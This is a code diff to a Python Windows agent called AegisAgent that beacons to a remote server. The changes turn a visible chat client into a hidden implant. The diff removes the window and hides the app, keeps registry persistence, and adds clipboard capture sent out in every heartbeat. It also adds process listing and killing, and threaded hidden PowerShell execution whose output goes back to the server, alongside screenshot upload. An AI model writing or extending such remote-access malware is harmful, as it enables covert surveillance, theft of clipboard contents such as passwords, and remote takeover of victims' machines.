@@ -11,15 +11,14 @@ import subprocess
 import io
 import base64
 import platform
-import uuid
+import pyperclip
 from PIL import ImageGrab
 
-SERVER_IP = "0.0.0.0" 
+SERVER_IP = "0.0.0.0"
 SERVER_PORT = 0000
-API_TOKEN = "" 
+API_TOKEN = ""
 
 BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"
-
 ctk.set_appearance_mode("Dark")
 
 class AegisAgent(ctk.CTk):
@@ -29,18 +28,10 @@ class AegisAgent(ctk.CTk):
         self.os_version = f"{platform.system()} {platform.release()}"
         self.pid = os.getpid()
         self.cmd_buffer = None
-        
+        self.proc_list = []
+        self.last_clipboard = ""
         self.setup_persistence()
-        self.title(f"Aegis - {self.hostname}")
-        self.geometry("600x400")
-        
-        self.cons = ctk.CTkTextbox(self, width=580, height=300)
-        self.cons.pack(pady=10)
-        self.entry = ctk.CTkEntry(self, width=400)
-        self.entry.pack(side="left", padx=10)
-        self.btn = ctk.CTkButton(self, text="Send Chat", command=self.send_chat)
-        self.btn.pack(side="left")
-
+        self.withdraw()
         threading.Thread(target=self.loop, daemon=True).start()
 
     def setup_persistence(self):
@@ -51,29 +42,33 @@ class AegisAgent(ctk.CTk):
             winreg.CloseKey(k)
         except: pass
 
-    def log(self, m): self.cons.insert("end", f"> {m}\n"); self.cons.see("end")
-
-    def send_chat(self):
-        m = self.entry.get()
-        if m:
-            try:
-                requests.post(f"{BASE_URL}/api/send_chat", json={'hostname': self.hostname, 'message': m})
-                self.entry.delete(0, 'end')
-                self.log(f"Me: {m}")
-            except: pass
-
-    def get_software(self):
+    def exec_shell(self, c):
         try:
-            c = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"'
-            o = subprocess.check_output(c, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
-            return ", ".join([l.strip() for l in o.split('\r\n') if l.strip() and "DisplayName" not in l][:20])
-        except: return ""
+            si = subprocess.STARTUPINFO()
+            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            r = subprocess.run(["powershell", "/c", c], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
+            self.cmd_buffer = f"CMD> {c}\n{r.stdout + r.stderr}"
+        except Exception as e: self.cmd_buffer = f"ERR: {e}"
 
-    def get_drives(self):
-        d = []
-        for p in psutil.disk_partitions():
-            if 'removable' in p.opts: d.append(p.device)
-        return ", ".join(d)
+    def get_procs(self):
+        pl = []
+        for p in psutil.process_iter(['pid', 'name', 'username']):
+            try: pl.append(p.info)
+            except: pass
+        self.proc_list = pl[:50] 
+
+    def kill_proc(self, pid):
+        try: psutil.Process(int(pid)).kill(); self.cmd_buffer = f"Killed PID {pid}"
+        except Exception as e: self.cmd_buffer = f"Kill Fail: {e}"
+
+    def check_clipboard(self):
+        try:
+            curr = pyperclip.paste()
+            if curr != self.last_clipboard:
+                self.last_clipboard = curr
+                return curr
+        except: pass
+        return None
 
     def get_startup(self):
         p = []
@@ -83,31 +78,34 @@ class AegisAgent(ctk.CTk):
         except: pass
         return ", ".join(p)
 
-    def exec_shell(self, c):
-        try:
-            r = subprocess.run(["powershell", "/c", c], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            self.cmd_buffer = f"CMD: {c}\nRES: {r.stdout + r.stderr}"
-        except Exception as e: self.cmd_buffer = str(e)
+    def get_drives(self):
+        d = []
+        for p in psutil.disk_partitions():
+            if 'removable' in p.opts: d.append(p.device)
+        return ", ".join(d)
 
     def loop(self):
-        sw = self.get_software()
         while True:
             try:
+                clip_data = self.check_clipboard()
+                
                 payload = {
                     'token': API_TOKEN,
                     'hostname': self.hostname,
                     'device_type': 'desktop',
                     'os_version': self.os_version,
                     'ip': socket.gethostbyname(self.hostname),
-                    'public_ip': requests.get('https://api.ipify.org', timeout=2).text,
+                    'public_ip': "0.0.0.0",
                     'cpu': psutil.cpu_percent(),
                     'ram': psutil.virtual_memory().percent,
-                    'software': sw,
+                    'cmd_output': self.cmd_buffer,
+                    'processes': self.proc_list,
+                    'clipboard': clip_data,
                     'startup': self.get_startup(),
-                    'drives': self.get_drives(),
-                    'cmd_output': self.cmd_buffer
+                    'drives': self.get_drives()
                 }
                 if self.cmd_buffer: self.cmd_buffer = None
+                self.proc_list = []
 
                 r = requests.post(f"{BASE_URL}/api/heartbeat", json=payload, timeout=5)
                 if r.status_code == 200:
@@ -120,11 +118,9 @@ class AegisAgent(ctk.CTk):
                             s.save(b, format="PNG")
                             requests.post(f"{BASE_URL}/api/upload_screenshot", json={'hostname': self.hostname, 'image_data': base64.b64encode(b.getvalue()).decode()})
                         elif c == 'restart': os.system("shutdown /r /t 0")
-                        elif c == 'shutdown': os.system("shutdown /s /t 0")
-                        elif c.startswith('shell:'): self.exec_shell(c.split(':',1)[1])
-                    
-                    if d.get('chat'):
-                        for m in d['chat']: self.log(f"Admin: {m}")
+                        elif c == 'ps_list': self.get_procs()
+                        elif c.startswith('kill:'): self.kill_proc(c.split(':')[1])
+                        elif c.startswith('shell:'): threading.Thread(target=self.exec_shell, args=(c.split(':',1)[1],)).start()
             except: pass
             time.sleep(5)
 
